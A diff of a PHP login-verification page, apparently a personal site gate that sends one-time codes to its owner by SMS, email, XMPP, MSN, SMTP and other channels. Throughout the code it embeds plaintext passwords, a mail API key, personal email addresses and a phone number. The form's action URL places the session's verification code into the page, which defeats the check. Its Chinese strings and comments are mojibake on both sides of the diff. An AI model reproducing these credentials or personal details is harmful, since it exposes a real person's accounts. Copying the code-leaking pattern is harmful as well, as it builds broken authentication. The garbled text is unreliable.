                 <td align="center" valign='middle' style="<?php $style->selcolor($skincolor,'tdbg');?>">
                         <form action="<?php  echo httppath().'?api=verify&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&msgverify=';?>" method="post" name="verify">
-                        <input type="input" class="input" border="0" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;width:200px;font-size:12px;text-align:center;" <?php  $style->input("#f9f9f9","","msgverify");?> name="msgverify"  id="msgverify" value="¶ÌĞÅÑéÖ¤Âë" onmouseover="document.getElementById('msgverify').value=''; >  
+                        <input type="input" class="input" border="0" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;width:200px;font-size:12px;text-align:center;" <?php  $style->input("#f9f9f9","","msgverify");?> name="msgverify"  id="msgverify" value="çŸ­ä¿¡éªŒè¯ç " onmouseover="document.getElementById('msgverify').value=''; >  
                         <input type="hidden" class="text" name="skin" value="<?php echo $skincolor;?>"> 
                         &nbsp<input type="submit" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;width:50px;font-size:12px;text-align:center;<?php $style->selcolor($skincolor,'tdtbg');?>" class="button" name="docinSubmit" value=" Go ">
                 </td>
@@ -3730,8 +5358,8 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 elseif(strtoupper(trim(request('verify'))) != '' && strtoupper(trim(request('verifycode'))) != '' && strlen(trim(request('verifycode'))) == '32' && strtoupper(trim(request('msgverify'))) != '' && strlen(trim(request('msgverify'))) == '8'){
 
 session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
-//ini_set('session.gc_maxlifetime',60);  //ÉèÖÃÀ¬»ø»ØÊÕ×î´óÉú´æÊ±¼ä
-//ini_set('session.gc_probability',10);    //ºÍsession.gc_divisorÒ»Æğ¹¹³ÉÇå³ıÀ¬»øµÄÖ´ĞĞ¼¸ÂÊ
+//ini_set('session.gc_maxlifetime',60);  //è®¾ç½®åƒåœ¾å›æ”¶æœ€å¤§ç”Ÿå­˜æ—¶é—´
+//ini_set('session.gc_probability',10);    //å’Œsession.gc_divisorä¸€èµ·æ„æˆæ¸…é™¤åƒåœ¾çš„æ‰§è¡Œå‡ ç‡
 //ini_set('session.gc_divisor',1);
 session_start();
 if(substr(PHP_VERSION, 0, 3)=='5.4'){
@@ -3746,29 +5374,29 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                         }
                         else{
      	 if (strtolower(trim(request('verify'))) == 'sim'){
-                              //mail('xcy6272003@126.com','X3193ÒÑ¾­³É¹¦ÑéÖ¤ÁËÄúµÄ·ÃÎÊÈ¨ÏŞ','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
+                              //mail('xcy6272003@126.com','X3193å·²ç»æˆåŠŸéªŒè¯äº†æ‚¨çš„è®¿é—®æƒé™','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                   //$html = new mail_class();
-                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193ÒÑ¾­³É¹¦ÑéÖ¤ÁËÄúµÄ·ÃÎÊÈ¨ÏŞ', '±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
+                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193å·²ç»æˆåŠŸéªŒè¯äº†æ‚¨çš„è®¿é—®æƒé™', 'æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
             		$voxeo = new voxeo_class();
                 $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','Success! The verification code is : '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].', and the IP is :'.$_SERVER['REMOTE_ADDR']);
                               
                       }        
             elseif (strtolower(trim(request('verify'))) == 'email'){
                   $html = new mail_class();
-                  $html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193ÒÑ¾­³É¹¦ÑéÖ¤ÁËÄúµÄ·ÃÎÊÈ¨ÏŞ', '±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
+                  $html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193å·²ç»æˆåŠŸéªŒè¯äº†æ‚¨çš„è®¿é—®æƒé™', 'æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
                       }
       			elseif (strtolower(trim(request('verify'))) == 'sendcloud'){
 
             				
       $url = 'http://sendcloud.sohu.com/webapi/mail.send.json';
-      //²»Í¬ÓÚµÇÂ¼SendCloudÕ¾µãµÄÕÊºÅ£¬ÄúĞèÒªµÇÂ¼ºóÌ¨´´½¨·¢ĞÅ×ÓÕÊºÅ£¬Ê¹ÓÃ×ÓÕÊºÅºÍÃÜÂë²Å¿ÉÒÔ½øĞĞÓÊ¼şµÄ·¢ËÍ¡£
+      //ä¸åŒäºç™»å½•SendCloudç«™ç‚¹çš„å¸å·ï¼Œæ‚¨éœ€è¦ç™»å½•åå°åˆ›å»ºå‘ä¿¡å­å¸å·ï¼Œä½¿ç”¨å­å¸å·å’Œå¯†ç æ‰å¯ä»¥è¿›è¡Œé‚®ä»¶çš„å‘é€ã€‚
       $param = array('api_user' => 'x3193_tk',
               'api_key' => '4tGTE5IWEArQMoVA',
               'from' => 'x3193@x3193.tk',
               'fromname' => 'x3193.tk',
               'to' => 'xcy6272003@126.com',
-              'subject' => iconv('gb2312','utf-8','X3193.TKÒÑ¾­³É¹¦ÑéÖ¤ÁËÄúµÄ·ÃÎÊÈ¨ÏŞ'),
-              'html' => iconv('gb2312','utf-8','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
+              'subject' => iconv('gb2312','utf-8','X3193.TKå·²ç»æˆåŠŸéªŒè¯äº†æ‚¨çš„è®¿é—®æƒé™'),
+              'html' => iconv('gb2312','utf-8','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
       $options = array('http' => array('method'  => 'POST','content' => http_build_query($param)));
       $context  = stream_context_create($options);
       $result = file_get_contents($url, false, $context);
@@ -3778,52 +5406,52 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
             }   
             elseif (strtolower(trim(request('verify'))) == 'jabber' || strtolower(trim(request('verify'))) == 'gtalk'){
                $imified = new imified_class();
-                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','x3193@g.x3193.cz.cc','gtalk','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
+                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','x3193@g.x3193.cz.cc','gtalk','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
             }   
             elseif (strtolower(trim(request('verify'))) == 'yahoo'){
                $imified = new imified_class();
-                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','xcy6272003@yahoo.com','yahoo','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
+                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','xcy6272003@yahoo.com','yahoo','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
             }   
             elseif (strtolower(trim(request('verify'))) == 'xmpp'){
                $conn = new XMPPHP_XMPP('talk.google.com', 5222, 'xcy6272003@gmail.com', 'EUIfgwe7a', 'xmpphp', 'gmail.com', $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);
                    $conn->connect();
                    $conn->processUntil('session_start');
                    $conn->presence();
-                   $conn->message('x3193@g.x3193.tk', iconv('gb2312','utf-8','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
+                   $conn->message('x3193@g.x3193.tk', iconv('gb2312','utf-8','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
                    $conn->disconnect();
                  
             } 
       			elseif (strtolower(trim(request('verify'))) == 'msn'){
 								$sendMsg = new sendMsg();
-								$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
+								$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
 								//echo $sendMsg->result.' '.$sendMsg->error;
       			}   
       			elseif (strtolower(trim(request('verify'))) == 'smtp'){
 							$smtp = new smtp('smtp.x3193.tk','25',true,'x3193@x3193.tk','EUIfgwe7');
-        			$smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡'), iconv('gb2312','gb2312','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
+        			$smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼'), iconv('gb2312','gb2312','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
      				}            
             elseif (strtolower(trim(request('verify'))) == 'gcal'){
                     	$google_calendar = new google_class();
                     	$AuthClientLogin = $google_calendar->googleauthclientlogin(trim(base64_encode('xcy6272003@gmail.com')),trim(base64_encode('EUIfgwe7a')),trim('calendar'));
-               		$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡,±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].'IPµØÖ·Îª£º'.$_SERVER['REMOTE_ADDR']),trim('X3193µÇÂ¼ÑéÖ¤'),trim('X3193µÇÂ¼ÑéÖ¤Ä£¿é'));
+               		$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼,æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].'IPåœ°å€ä¸ºï¼š'.$_SERVER['REMOTE_ADDR']),trim('X3193ç™»å½•éªŒè¯'),trim('X3193ç™»å½•éªŒè¯æ¨¡å—'));
             }
             elseif (strtolower(trim(request('verify'))) == 'voxeo'){
                //$voxeo = new voxeo_class();
-               //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
+               //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
             		$voxeo = new voxeo_class();
                 $voxeo->voxeosendsms('+8615998963077','Success! The verification code is : '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
                
             }
        			elseif (strtolower(trim(request('verify'))) == 'fetion'){
        				
-							$fetion = new fetion_class();	// ÊÖ»úºÅ¡¢·ÉĞÅÃÜÂë
-							$fetion->sendmsg('',iconv('gb2312','utf-8','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// ½ÓÊÕÈËÊÖ»úºÅ¡¢·ÉĞÅÄÚÈİ      	
+							$fetion = new fetion_class();	// æ‰‹æœºå·ã€é£ä¿¡å¯†ç 
+							$fetion->sendmsg('','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);	// æ¥æ”¶äººæ‰‹æœºå·ã€é£ä¿¡å†…å®¹      	
        				
-							//$fetion = new PHPFetion('15998963077', 'EUIfgwe7');	// ÊÖ»úºÅ¡¢·ÉĞÅÃÜÂë
-							//$fetion->send('15998963077', iconv('gb2312','utf-8','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// ½ÓÊÕÈËÊÖ»úºÅ¡¢·ÉĞÅÄÚÈİ      	
+							//$fetion = new PHPFetion('15998963077', 'EUIfgwe7');	// æ‰‹æœºå·ã€é£ä¿¡å¯†ç 
+							//$fetion->send('15998963077', iconv('gb2312','utf-8','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// æ¥æ”¶äººæ‰‹æœºå·ã€é£ä¿¡å†…å®¹      	
       	
    					 //$voxeo = new voxeo_class();
-             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
+             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
       			}            
          }
          
@@ -3849,29 +5477,29 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                         }
                         else{
             if (strtolower(trim(request('verify'))) == 'sms'){
-                                   //mail('xcy6272003@126.com','X3193ÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞÊ§°Ü','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡ÇëÖØĞÂÑéÖ¤£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
+                                   //mail('xcy6272003@126.com','X3193éªŒè¯æ‚¨çš„è®¿é—®æƒé™å¤±è´¥','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼è¯·é‡æ–°éªŒè¯ï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                   //$html = new mail_class();
-                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193ÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞÊ§°Ü', '±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡ÇëÖØĞÂÑéÖ¤£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
+                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193éªŒè¯æ‚¨çš„è®¿é—®æƒé™å¤±è´¥', 'æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼è¯·é‡æ–°éªŒè¯ï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
             		$voxeo = new voxeo_class();
-                $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','Sorry! The verification code is£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].', and the IP is :'.$_SERVER['REMOTE_ADDR']);
+                $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','Sorry! The verification code isï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].', and the IP is :'.$_SERVER['REMOTE_ADDR']);
                                    
             }
             elseif (strtolower(trim(request('verify'))) == 'email'){
-                                   //mail('xcy6272003@126.com','X3193ÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞÊ§°Ü','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡ÇëÖØĞÂÑéÖ¤£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
+                                   //mail('xcy6272003@126.com','X3193éªŒè¯æ‚¨çš„è®¿é—®æƒé™å¤±è´¥','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼è¯·é‡æ–°éªŒè¯ï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                   $html = new mail_class();
-                  $html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193ÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞÊ§°Ü', '±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡ÇëÖØĞÂÑéÖ¤£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
+                  $html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193éªŒè¯æ‚¨çš„è®¿é—®æƒé™å¤±è´¥', 'æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼è¯·é‡æ–°éªŒè¯ï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
                                   
             }
       			elseif (strtolower(trim(request('verify'))) == 'sendcloud'){
       $url = 'http://sendcloud.sohu.com/webapi/mail.send.json';
-      //²»Í¬ÓÚµÇÂ¼SendCloudÕ¾µãµÄÕÊºÅ£¬ÄúĞèÒªµÇÂ¼ºóÌ¨´´½¨·¢ĞÅ×ÓÕÊºÅ£¬Ê¹ÓÃ×ÓÕÊºÅºÍÃÜÂë²Å¿ÉÒÔ½øĞĞÓÊ¼şµÄ·¢ËÍ¡£
+      //ä¸åŒäºç™»å½•SendCloudç«™ç‚¹çš„å¸å·ï¼Œæ‚¨éœ€è¦ç™»å½•åå°åˆ›å»ºå‘ä¿¡å­å¸å·ï¼Œä½¿ç”¨å­å¸å·å’Œå¯†ç æ‰å¯ä»¥è¿›è¡Œé‚®ä»¶çš„å‘é€ã€‚
       $param = array('api_user' => 'x3193_tk',
               'api_key' => '4tGTE5IWEArQMoVA',
               'from' => 'x3193@x3193.tk',
               'fromname' => 'x3193.tk',
               'to' => 'xcy6272003@126.com',
-              'subject' => iconv('gb2312','utf-8','X3193ÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞÊ§°Ü'),
-              'html' => iconv('gb2312','utf-8','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡ÇëÖØĞÂÑéÖ¤£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
+              'subject' => iconv('gb2312','utf-8','X3193éªŒè¯æ‚¨çš„è®¿é—®æƒé™å¤±è´¥'),
+              'html' => iconv('gb2312','utf-8','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼è¯·é‡æ–°éªŒè¯ï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
       $options = array('http' => array('method'  => 'POST','content' => http_build_query($param)));
       $context  = stream_context_create($options);
       $result = file_get_contents($url, false, $context);
@@ -3881,50 +5509,50 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
             }   
             elseif (strtolower(trim(request('verify'))) == 'jabber' || strtolower(trim(request('verify'))) == 'gtalk'){
                $imified = new imified_class();
-                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','x3193@g.x3193.cz.cc','gtalk','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡ÇëÖØĞÂÑéÖ¤£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
+                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','x3193@g.x3193.cz.cc','gtalk','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼è¯·é‡æ–°éªŒè¯ï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
             }   
             elseif (strtolower(trim(request('verify'))) == 'yahoo'){
                $imified = new imified_class();
-                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','xcy6272003@yahoo.com','yahoo','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
+                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','xcy6272003@yahoo.com','yahoo','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
             }   
             elseif (strtolower(trim(request('verify'))) == 'xmpp'){
                $conn = new XMPPHP_XMPP('talk.google.com', 5222, 'xcy6272003@gmail.com', 'EUIfgwe7a', 'xmpphp', 'gmail.com', $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);
                    $conn->connect();
                    $conn->processUntil('session_start');
                    $conn->presence();
-                   $conn->message('x3913@g.x3193.cz.cc', iconv('gb2312','utf-8','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡ÇëÖØĞÂÑéÖ¤£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
+                   $conn->message('x3913@g.x3193.cz.cc', iconv('gb2312','utf-8','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼è¯·é‡æ–°éªŒè¯ï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
                    $conn->disconnect();
             } 
       			elseif (strtolower(trim(request('verify'))) == 'msn'){
 								$sendMsg = new sendMsg();
-								$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡ÇëÖØĞÂÑéÖ¤£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
+								$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼è¯·é‡æ–°éªŒè¯ï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
 								//echo $sendMsg->result.' '.$sendMsg->error;
       			}    
       			elseif (strtolower(trim(request('verify'))) == 'smtp'){
 							$smtp = new smtp('smtp.x3193.tk','25',true,'x3193@x3193.tk','EUIfgwe7');
-        			$smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡'), iconv('gb2312','gb2312','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
+        			$smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼'), iconv('gb2312','gb2312','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
      				}      			           
             elseif (strtolower(trim(request('verify'))) == 'gcal'){
                     	$google_calendar = new google_class();
